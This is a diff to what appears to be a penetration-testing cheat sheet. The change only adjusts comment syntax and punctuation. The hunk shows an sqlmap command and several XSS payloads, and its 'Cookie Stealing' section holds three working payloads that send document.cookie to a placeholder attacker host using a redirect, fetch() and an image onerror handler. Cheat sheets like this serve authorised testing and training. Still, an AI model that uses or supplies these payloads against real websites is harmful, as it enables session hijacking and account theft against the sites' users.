@@ -183,18 +183,18 @@ sqlmap -r request.txt -p <target_param> --level=5 --risk=3 --batch --delay=0.1 -
 ### Basic Payloads
 ```javascript
 <script>alert('XSS');</script>
-<script>alert(document.cookie)</script>
+<script>alert(document.cookie);</script>
 <img src=x onerror=alert('XSS');>
 <svg onload=alert('XSS');>
 ```
 
 ### Cookie Stealing
 ```javascript
-# Redirect with cookies
+// Redirect with cookies
 <script>document.location='http://<attacker_ip>:<attacker_port>//steal?cookie='+document.cookie;</script>
 <script>fetch('http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie);</script>
 
-# Using image object (works in environments where script tags are filtered)
+// Using image object (works in environments where script tags are filtered)
 <img src=x onerror="this.src='http://<attacker_ip>:<attacker_port>/steal?cookie='+document.cookie;">
 ```
 
